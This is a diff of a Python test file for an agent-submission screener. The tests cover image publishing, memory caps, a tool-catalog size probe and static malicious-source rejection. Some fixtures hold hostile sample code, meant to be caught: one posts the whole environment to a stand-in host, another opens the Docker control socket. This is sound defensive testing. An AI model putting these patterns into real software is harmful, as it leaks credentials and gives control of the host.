@@ -23,7 +23,10 @@ import httpx
 import pytest
 
 from ditto_screener import gate as gate_module
+from ditto_screener import tool_catalog_probe
 from ditto_screener.config import ScreenerConfig
+from ditto_screener.errors import ScreenedImageUploadUnavailable
+from ditto_screener.fake_gateway import measure_model_request
 from ditto_screener.gate import (
     _MAX_ARCHIVE_MEMBERS,
     _MAX_SCREENED_IMAGE_BYTES,
@@ -64,6 +67,7 @@ from ditto_screening_protocol import (
     SCREENING_POLICY_VERSION,
     ScoredRuntimeEvidenceLease,
 )
+from ditto_screening_protocol.reason_codes import ReasonCodeClass, reason_code_class
 
 _AGENT = UUID("550e8400-e29b-41d4-a716-446655440000")
 _ATTEMPT = UUID("7c5df3f9-3ea7-47ba-92d1-1bbcf4c5f300")
@@ -1338,7 +1342,50 @@ async def test_publish_failure_demotes_pass_with_dedicated_reason(
         )
     assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
     assert result.evidence[-1].code == "image-upload-failed"
+    assert reason_code_class(result.evidence[-1].code) == ReasonCodeClass.OPERATOR_RETRY
     assert "object storage unavailable" in result.detail
+
+
+async def test_publish_platform_outage_is_fleet_infra(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar()
+    saved_archive, _, _ = _oci_image_save_archive()
+
+    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
+        if args[0] == "build":
+            if stdin is not None:
+                stdin.read()
+            _write_iidfile(args)
+        elif args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
+            return 0, "sha256:" + "34" * 32
+        elif args[:3] == ["image", "inspect", "--format"]:
+            if "Config.Volumes" in args[3]:
+                return 0, ""
+            return 0, str(len(saved_archive))
+        elif args[:3] == ["image", "save", "--output"]:
+            Path(args[3]).write_bytes(saved_archive)
+        return 0, ""
+
+    async def fail_publish(_image: Any) -> None:
+        raise ScreenedImageUploadUnavailable("image upload initiate rejected (502): ")
+
+    gate = _gate_with(make_config(), run, tarball=tarball)
+    async with gate._client:
+        result = await gate.screen(
+            agent_id=_AGENT,
+            attempt_id=_ATTEMPT,
+            bench_version=12,
+            miner_hotkey=_MINER,
+            sha256=hashlib.sha256(tarball).hexdigest(),
+            download_url=_URL,
+            publish_image=fail_publish,
+        )
+    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
+    # Platform retries this code automatically (FLEET_INFRA).
+    assert result.evidence[-1].code == "image-upload-platform-unavailable"
+    assert reason_code_class(result.evidence[-1].code) == ReasonCodeClass.FLEET_INFRA
+    assert "initiate rejected (502)" in result.detail
 
 
 async def test_publish_uses_stable_agent_ref_with_attempt_scoped_build(
@@ -1581,6 +1628,105 @@ async def test_static_preflight_v2_enforce_does_not_hold_excluded_local_helper(
 
     async with gate._client:
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert any(call[0] == "build" for call in calls)
+
+
+async def test_mechanical_lane_rejects_static_malicious_source_before_docker(
+    make_config: Callable[..., ScreenerConfig],
+    caplog: pytest.LogCaptureFixture,
+) -> None:
+    """Source review is retired; the static safety preflight still runs.
+
+    On the build-only lane a decisive, reachable static match is a
+    deterministic reject with location-only evidence. Nothing is held and no
+    submission-controlled build or runtime starts.
+    """
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
+            "src/main.rs": (
+                b'let endpoint = "/var/run/docker.sock";\n'
+                b"connect_control_socket(endpoint);\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "static-malicious-source"
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert "src/main.rs:" in result.detail
+    assert "/var/run/docker.sock" not in result.detail
+    assert "static-source safety reject" in caplog.text
+    assert "execution_started=false" in caplog.text
+
+
+async def test_mechanical_lane_rejects_v2_reachable_causal_match(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "static-malicious-source"
+    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert "app.py:" in result.detail
+
+
+async def test_mechanical_lane_passes_excluded_local_helper(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    """A match only in a file the build never copies is not a safety reject."""
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
 
     assert result.outcome == ScreeningOutcome.PASS
     assert any(call[0] == "build" for call in calls)
@@ -2565,7 +2711,8 @@ async def test_fake_gateway_is_internal_and_resource_capped(
     assert ca_mount.endswith(",readonly")
     assert "SSL_CERT_FILE=/run/dittobench/openrouter-shim-ca.pem" in harness
     assert "fake-gateway" not in " ".join(harness)
-    assert {"--memory", "3g", "--pids-limit", "512"} <= set(harness)
+    # The published envelope cap when Platform stamps none; never a stale 3g.
+    assert {"--memory", "8192m", "--memory-swap", "--pids-limit", "512"} <= set(harness)
     assert {"--init", "--user", "65532:65532", "--read-only"} <= set(harness)
     assert {"--ipc", "none", "--log-driver", "local"} <= set(harness)
     assert {"max-size=8m", "max-file=1", "compress=false"} <= set(harness)
@@ -3806,10 +3953,27 @@ async def test_seed_probe_reports_the_memory_cap_when_the_container_is_oom_kille
         tarball=tarball,
     )
     async with gate._client:
-        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
+        result = await gate.screen(
+            agent_id=_AGENT,
+            attempt_id=_ATTEMPT,
+            bench_version=12,
+            miner_hotkey=_MINER,
+            sha256=hashlib.sha256(tarball).hexdigest(),
+            download_url=_URL,
+            sandbox_memory_limit_mib=6144,
+        )
 
     assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
-    assert "memory cap" in result.detail
+    # The probe ran at the live cap Platform stamped, and the rejection names
+    # that cap rather than claiming a parity it does not have.
+    harness = next(
+        call
+        for call in calls
+        if "--network-alias" in call
+        and call[call.index("--network-alias") + 1] == "harness"
+    )
+    assert harness[harness.index("--memory") + 1] == "6144m"
+    assert "6144 MiB sandbox memory cap" in result.detail
     assert any(item.code == "seed-memory-cap" for item in result.evidence)
 
 
@@ -3849,7 +4013,7 @@ async def test_envelope_usage_is_recorded_for_a_passing_image(
     # A passing image is exactly the case rejections cannot answer: how much of
     # the envelope the fleet actually uses.
     assert "393 MiB" in usage.summary
-    assert "3g" in usage.summary
+    assert "8192 MiB" in usage.summary
     assert "12 MiB" in usage.summary
 
 
@@ -3960,6 +4124,224 @@ def test_seed_evidence_never_exceeds_the_decision_bound() -> None:
     assert result.reason_code == "health-ok"
 
 
+def test_both_probes_keep_their_records_on_a_saturated_decision() -> None:
+    # Capping per probe let the seed records evict the catalog records that
+    # were appended just before them, losing the shadow measurement.
+    saturated = ScreeningDecision(
+        outcome=ScreeningOutcome.PASS,
+        detail="",
+        manifest_digest=CORE_ONLY_MANIFEST.digest,
+        reason_code="health-ok",
+        evidence=tuple(
+            PolicyEvidence("stable-core", f"filler-{index}", "x") for index in range(16)
+        ),
+    )
+    seed = gate_module._SeedProbe(
+        False,
+        "seed-memory-cap",
+        "the harness exceeded the sandbox memory cap",
+        usage=gate_module._SandboxUsage(412_000_000, 12_345, 536_870_912),
+    )
+    catalog = tool_catalog_probe.ProbeVerdict(
+        False,
+        tool_catalog_probe.CONTEXT_OVERFLOW_CODE,
+        "the harness forwarded 2000 tool definitions",
+        "highest-floor request has 2000 tools",
+    )
+
+    result = gate_module._with_probe_evidence(
+        saturated,
+        [
+            *gate_module._tool_catalog_probe_records(catalog),
+            *gate_module._seed_probe_records(seed),
+        ],
+    )
+
+    assert len(result.evidence) == 16
+    assert [item.code for item in result.evidence[-4:]] == [
+        tool_catalog_probe.CONTEXT_OVERFLOW_CODE,
+        tool_catalog_probe.OBSERVATION_CODE,
+        "seed-memory-cap",
+        "seed-envelope-usage",
+    ]
+    assert result.outcome == ScreeningOutcome.PASS
+    assert result.reason_code == "health-ok"
+
+
+def _catalog_probe_run(
+    calls: list[list[str]], *, forward: int | None, run_exit: int = 0
+) -> Callable[..., Any]:
+    """`_ok_run` whose harness forwards ``forward`` of the offered tools.
+
+    It reads the staged ``/run`` body from the gateway state directory and
+    appends what the real sidecar gateway would measure for the chat request
+    the harness makes. ``forward=None`` forwards the whole catalog.
+    """
+    ok = _ok_run(calls)
+    state: dict[str, Path] = {}
+
+    async def run(
+        args: list[str], *, stdin: Any = None, **kwargs: Any
+    ) -> tuple[int, str]:
+        if args[0] == "run":
+            for index, arg in enumerate(args[:-1]):
+                if arg == "-v" and args[index + 1].endswith(":/state"):
+                    state["dir"] = Path(args[index + 1].rsplit(":", 1)[0])
+        if args[0] == "exec" and "http://harness:8080/run" in args:
+            calls.append(args)
+            staged = args[args.index("http://harness:8080/run") + 2]
+            assert staged == "@/state/tool-catalog-run.json"
+            request = json.loads((state["dir"] / "tool-catalog-run.json").read_bytes())
+            tools = request["tools"] if forward is None else request["tools"][:forward]
+            body = json.dumps(
+                {
+                    "model": "openai/gpt-oss-20b",
+                    "messages": [
+                        {"role": "system", "content": request["system_prompt"]},
+                        {"role": "user", "content": request["user_input"]},
+                    ],
+                    "tools": [{"type": "function", "function": t} for t in tools],
+                }
+            ).encode()
+            with (state["dir"] / "model-requests").open("ab") as log:
+                log.write(json.dumps(measure_model_request(body)).encode() + b"\n")
+            if run_exit:
+                return run_exit, "HTTP 500: boom"
+            return 0, '{"answer": "ok", "tool_calls": []}'
+        return await ok(args, stdin=stdin, **kwargs)
+
+    return run
+
+
+async def _screen_v18(gate: BuildGate, tarball: bytes):  # type: ignore[no-untyped-def]
+    async with gate._client:
+        return await gate.screen(
+            agent_id=_AGENT,
+            attempt_id=_ATTEMPT,
+            bench_version=18,
+            miner_hotkey=_MINER,
+            sha256=hashlib.sha256(tarball).hexdigest(),
+            download_url=_URL,
+        )
+
+
+def _catalog_runs(calls: list[list[str]]) -> list[list[str]]:
+    return [call for call in calls if "http://harness:8080/run" in call]
+
+
+async def test_tool_catalog_probe_passes_a_harness_that_selects_tools(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode="enforce"),
+        _catalog_probe_run(calls, forward=8),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert len(_catalog_runs(calls)) == 1
+    # The ~1 MiB body travels as a staged file, never as a process argument
+    # (Linux caps one argument at 128 KiB).
+    assert all(len(arg) < 128 * 1024 for arg in _catalog_runs(calls)[0])
+    codes = [item.code for item in result.evidence]
+    assert "tool-catalog-context-overflow" not in codes
+    size = next(i for i in result.evidence if i.code == "tool-catalog-request-size")
+    assert "8 tools" in size.summary
+    assert "Groq" not in size.summary
+
+
+async def test_tool_catalog_probe_enforce_rejects_a_context_overflow(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode="enforce"),
+        _catalog_probe_run(calls, forward=None),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "tool-catalog-context-overflow"
+    assert "131072-token context window" in result.detail
+    assert "2000 tool definitions" in result.detail
+    assert (
+        reason_code_class("tool-catalog-context-overflow")
+        == ReasonCodeClass.AGENT_FAULT
+    )
+
+
+async def test_tool_catalog_probe_shadow_records_an_overflow_without_failing(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(),  # shadow is the default
+        _catalog_probe_run(calls, forward=None),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert result.reason_code != "tool-catalog-context-overflow"
+    codes = [item.code for item in result.evidence]
+    assert "tool-catalog-context-overflow" in codes
+    size = next(i for i in result.evidence if i.code == "tool-catalog-request-size")
+    assert "2000 tools" in size.summary and "Groq" in size.summary
+
+
+async def test_tool_catalog_probe_passes_when_the_run_fails(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    # A failed /run says nothing certain about the request size. The probe
+    # still judges only what the gateway measured.
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode="enforce"),
+        _catalog_probe_run(calls, forward=0, run_exit=22),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.PASS
+    size = next(i for i in result.evidence if i.code == "tool-catalog-request-size")
+    assert "/run failed" in size.summary
+
+
+@pytest.mark.parametrize(
+    ("mode", "bench_version"), [("off", 18), ("enforce", 17), ("shadow", 12)]
+)
+async def test_tool_catalog_probe_skips_when_off_or_before_v18(
+    make_config: Callable[..., ScreenerConfig], mode: str, bench_version: int
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode=mode),
+        _catalog_probe_run(calls, forward=None),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await gate.screen(
+            agent_id=_AGENT,
+            attempt_id=_ATTEMPT,
+            bench_version=bench_version,
+            miner_hotkey=_MINER,
+            sha256=hashlib.sha256(tarball).hexdigest(),
+            download_url=_URL,
+        )
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert not _catalog_runs(calls)
+    assert not any(i.code.startswith("tool-catalog-") for i in result.evidence)
+
+
 def test_screening_locks_the_same_persistence_paths_as_scoring() -> None:
     # The scorer pins DITTOBENCH_DB and DITTOBENCH_MEMORY_PATH into the miner
     # sandbox. Screening runs the same envelope, so a harness honouring either
@@ -4018,3 +4400,51 @@ def test_gate_retries_a_relayed_provider_body_fault_once(make_config) -> None:  
     # relayed provider fault and parked as l3-adjudicator-model-provider-fault.
     gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
     assert gate._source_reviewer._l2._retry_provider_body_fault_once is True
+
+
+def test_static_reject_detail_keeps_its_brackets_when_bounded() -> None:
+    """Long paths drop whole trailing locations, never the closing brackets."""
+    from ditto_screener.gate import static_malicious_source_detail
+    from ditto_screener.policy import SourceReviewObservation
+
+    evidence = [
+        {"path": f"{'deep/' * 30}file_{index}.py", "line": index + 1, "category": "c"}
+        for index in range(16)
+    ]
+    observation = SourceReviewObservation(
+        ok=True,
+        risk_level="high",
+        finding_digest="ab" * 32,
+        categories=("credential_exfiltration",),
+        finding={"evidence": evidence},
+    )
+    detail = static_malicious_source_detail(observation)
+
+    assert len(detail) <= 1000
+    assert detail.startswith(
+        "static safety check matched categories=[credential_exfiltration] locations=["
+    )
+    assert "]; remove or make the flagged code unreachable and resubmit" in detail
+    assert "file_0.py:1" in detail
+
+
+def test_static_reject_detail_omits_paths_with_list_delimiters() -> None:
+    from ditto_screener.gate import static_malicious_source_detail
+    from ditto_screener.policy import SourceReviewObservation
+
+    observation = SourceReviewObservation(
+        ok=True,
+        risk_level="high",
+        finding_digest="ab" * 32,
+        categories=("docker_socket",),
+        finding={
+            "evidence": [
+                {"path": "a,b.py", "line": 1, "category": "c"},
+                {"path": "x]y.py", "line": 2, "category": "c"},
+                {"path": "ok.py", "line": 3, "category": "c"},
+            ]
+        },
+    )
+    detail = static_malicious_source_detail(observation)
+    assert "locations=[ok.py:3]" in detail
+    assert "a,b.py" not in detail
